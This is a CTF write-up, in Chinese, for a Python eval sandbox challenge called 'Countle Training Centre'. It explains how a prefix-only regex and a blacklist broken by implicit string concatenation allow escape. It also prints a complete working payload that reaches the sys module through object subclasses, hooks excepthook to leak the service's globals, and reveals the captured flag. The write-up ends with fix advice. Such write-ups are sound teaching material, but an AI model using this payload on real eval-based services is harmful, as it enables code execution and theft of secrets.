# Countle Training Centre

## 题目简述

服务声称要连续完成一百万道数字运算题，但用户答案会被直接送入 Python `eval`。虽然服务设置了字符正则、关键字黑名单、160 字符长度限制，并把 `__builtins__` 设为 `None`，这些防护仍可被对象模型与全局异常钩子绕过。

这题的决定性原语是 Python 沙箱逃逸而不是解算 Countle，因此按执行边界归入 Pwn。代码中还存在一个逻辑错误：内层黑名单循环复用了外层计数变量 `_`，导致正常流程中的 `if (_ == 2)` 永远无法按预期在第三题发 flag。

## 解题过程

输入检查使用的是：

```python
match(r"[0-9+\-*/()]+", expr)
```

`re.match` 这里只要求字符串开头存在一段合法字符，没有用 `$` 或 `fullmatch` 约束整个输入。只要 payload 以 `(` 开头，后续字母、引号和点号仍会进入 `eval`。黑名单中又漏写了逗号：

```python
'builtins' 'cat'
'signal' 'subprocess'
```

Python 会把相邻字符串字面量分别拼成 `builtinscat` 与 `signalsubprocess`，使原本计划单独阻止的词失效。

官方 payload 长度恰好为 159 字符：

```python
(s:=().__class__.__base__.__subclasses__()[120]().load_module('sys'),s.__setattr__('excepthook',lambda *a:s.stdout.write(a[2].tb_frame.f_globals.__str__())),a)
```

其执行链如下：

1. `().__class__.__base__` 从空元组类型走到 `object`。
2. `object.__subclasses__()[120]` 在远端 Python 3.12 镜像中对应可加载内建模块的类，调用 `load_module('sys')` 取得 `sys`。
3. 把 `sys.excepthook` 改成一个 lambda；发生未捕获异常时，它会把 traceback 外层帧的 `f_globals` 写到标准输出。
4. 元组最后求值未定义名称 `a`，主动触发 `NameError`。

虽然 `eval` 自己收到的 globals 中只有诱饵 `FLAG="no flag for you"`，未捕获异常会继续冒泡到服务主模块。异常钩子观察到的外层 traceback 帧属于服务脚本，其全局字典含真实 `FLAG`，于是响应中泄露：

```text
grey{4_w0r1D_c1As5_c0Un7L3_p1aY3r_1n_0uR_mId5t}
```

## 方法总结

字符白名单必须匹配完整输入，`re.match` 的前缀成功不能充当验证。即使移除 builtins，Python 对象图仍可能提供模块加载、文件访问或进程能力；黑名单策略还容易受字面量拼接和版本差异影响。本题的 payload 依赖远端 `__subclasses__()` 顺序，迁移环境时应先重新确认索引，真正的修复则是完全避免对不可信输入执行 `eval`，并用语法树白名单实现四则运算解释器。
